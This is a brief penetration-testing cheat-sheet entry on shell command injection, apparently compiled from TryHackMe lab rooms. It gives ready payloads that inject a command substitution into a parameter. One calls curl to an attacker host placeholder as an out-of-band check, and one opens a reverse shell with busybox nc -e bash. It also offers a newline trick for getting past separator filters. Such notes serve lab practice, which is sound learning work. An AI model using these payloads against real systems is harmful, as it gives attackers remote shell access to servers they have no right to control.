# Command Injection

Any parameter that visibly maps to a shell utility's output (ping, traceroute, etc.) is worth testing for substitution.

```bash
# confirm with an out-of-band callback first
<param>=127.0.0.1$(curl http://<LHOST>)

# reverse shell once confirmed
<param>=127.0.0.1$(busybox nc <LHOST> <LPORT> -e bash)
```

If a naive filter blocks common separators (`;`, `|`, `&&`), try an unencoded newline instead — it's often missed.

— TryHackMe / Operation Promotion (`ping.php?host=`), Silent Monitor (newline filter bypass)
